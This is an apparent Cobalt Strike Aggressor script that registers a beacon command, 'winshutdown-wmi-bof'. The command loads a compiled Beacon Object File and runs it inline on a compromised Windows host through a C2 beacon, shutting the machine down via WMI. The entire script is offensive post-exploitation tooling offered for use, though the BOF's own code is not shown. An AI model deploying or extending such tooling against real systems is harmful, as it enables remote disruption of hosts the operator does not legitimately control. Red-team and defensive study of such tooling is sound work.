# author @mooolight

beacon_command_register(
	"winshutdown-wmi-bof", "Shuts down the Windows OS through WMI.",
	"INFO:\nShut down operation that requires appropriate privileges (SE_SHUTDOWN_NAME) to the target process for access.\n\n" .
	"ARGUMENTS: None\n\n" .
	"USAGE:\nwinshutdown-wmi-bof\n\n".
	"EXAMPLES:\nwinshutdown-wmi-bof\n\n");

alias winshutdown-wmi-bof {
	
    # Read in the right BOF file
    $handle = openf(script_resource("winshutdown-wmi-bof.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $arg_data  = bof_pack($bid, "");

    blog($bid, "Windows OS shutdown operation through WMI.");
    beacon_inline_execute($bid, $data, "go", $arg_data);
}